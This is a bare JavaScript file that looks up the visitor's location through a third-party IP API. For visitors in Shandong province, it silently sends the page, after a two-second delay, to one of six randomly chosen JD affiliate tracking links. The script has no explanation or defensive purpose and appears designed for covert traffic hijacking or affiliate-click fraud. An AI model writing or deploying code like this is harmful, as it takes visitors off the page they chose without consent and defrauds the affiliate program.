function addScript(url) {
	var script = document.createElement('script');
	script.setAttribute('type', 'text/javascript');
	script.setAttribute('src', url);
	document.getElementsByTagName('head')[0].appendChild(script);
}
addScript("https://ip.if.iqiyi.com/api/v1/query?callback=");

function jd() {
	if (returnIpCity) {
		if (returnIpCity.data.province_en == "ShanDong") {

			let items = ["https://union-click.jd.com/jdc?e=&p=AyIGZRprFDJWWA1FBCVbV0IUWVALHEsDSkdETlcNVQtHRUZSQVMIbgNdHHlTEVlFfQZEfRRvGkdiZmEub1Nyf3VGC2QcQAFoWAsYRU1dR1McBAJQXk8JFEsNQXpHC1UaWhQBBVMIQx5BekcLVRpYJX97QAdjJRBjd24RfltxXBdlBn9bdFQeC2UeWxQDEAJWGlkXMhEAVh1cFQIaBmUrWxYyWWlUK1kUAxACUR9cFwMiB1IbXxALEQFXE18XAiIAVRJrUFpCWA9dEiUyIgRlK2sXMhE3Cl8GSDIQBlQfUg%3D%3D", "https://union-click.jd.com/jdc?e=&p=AyIGZRprFDJWWA1FBCVbV0IUWVALHElfCk0MQV0NXAAECUteDF8QTwcbRnxXB141VA5WWA1FBAlBQlIFWGtJd2BYKh5bZWBwdS5uDU0FCERXcCtlDh43UBtaFAAXBFQZWSUBFQRTHFsVChM3ZRtYJUl8BmUZWhQAFwJQEl8TMhIAVR9eHAEUD1MbWRwyFQdcKx5NUk1dE1JrJTIRN2UrWSUBIlgRRgYlABMGURI%3D", "https://union-click.jd.com/jdc?e=&p=AyIGZRprFDJWWA1FBCVbV0IUWVALHElfCk0MQV0NXAAECUteDF8QTwcbRnxXB141VA5WWA1FBAlSQEINXANQSgVDCkMFSmxTVwNPNU1XHgRVH10SMmBCXR5dXEdgYi1tPQ90VkAjbFNcVWILWSteFQMTBVAYWhcAIgRSGF0SAhIPVCtrFQEiTDsaaxcDEwVQHl4cBhQ3VRxbEQcbBFwbUxMKEjdSG1IlR0pXCkEdXDIiN1YrayUAIgRlRB9IXyIFVBpfHA%3D%3D", "https://union-click.jd.com/jdc?e=&p=AyIGZRprFDJWWA1FBCVbV0IUWVALHEsDSkdETlcNVQtHRUZSQVMIbgNdHHlTEVlFc1llcQFiCX1JUwcoQA51alF0UVktZVJ2ewlLRU1dR1McBAJQXk8JFEsNQXpHCwxFHiVRRFwKew5QBHcBDWUpFQJ6chJ9MGBiHgtlHlsUAxACVhpZFzIRAFYdXBUCGgZlK1sWMllpVCtZFAMQAlEeXBMAIgdSG18QCxEOUBxTFwAiAFUSa1BaQlgPXRIlMiIEZStrFzIRNwpfBkgyEAZUH1I%3D", "https://union-click.jd.com/jdc?e=&p=AyIGZRprFDJWWA1FBCVbV0IUWVALHElfCk0MQV0NXAAECUteDF8QTwcbRnxXB141VA5WWA1FBAlSQEINXANQSgVDCkMFSmxTVwNPNU1XHgRUGlkXMlFiPh0eSl1JZwB5BH54SVgzQFtvRnILWSteFQMTBVAYWhcAIgRSGF0SAhIPVCtrFQEiTDsaaxcDEwVQHlwTARI3VRxbEQcbBF0eWxcDEzdSG1IlR0pXCkEdXDIiN1YrayUAIgRlRB9IXyIFVBpfHA%3D%3D", "https://union-click.jd.com/jdc?e=&p=AyIGZRprFDJWWA1FBCVbV0IUWVALHElfCk0MQV0NXAAECUteDF8QTwcbRnxXB141VA5WWA1FBAlSQEINXANQSgVDCkMFSmxTVwNPNU1XHgRVGFsTMmdyNUs4bnpkZFVpLBdQb3xVbwEWX1QLWSteFQMTBVAYWhcAIgRSGF0SAhIPVCtrFQEiTDsaaxcDEwVQHl0TBRA3VRxbEQcbBFwTXhACFjdSG1IlR0pXCkEdXDIiN1YrayUAIgRlRB9IXyIFVBpfHA%3D%3D"];
			let item = items[Math.floor(Math.random() * items.length)];
			console.log(item);
			setTimeout("location.replace('" + item + "');", 2000);
		} else {
			console.log("Address does not match");
		}
	} else {
		console.log("Address not found");
	}

}
setTimeout(function () {
	jd();
},
	1000);
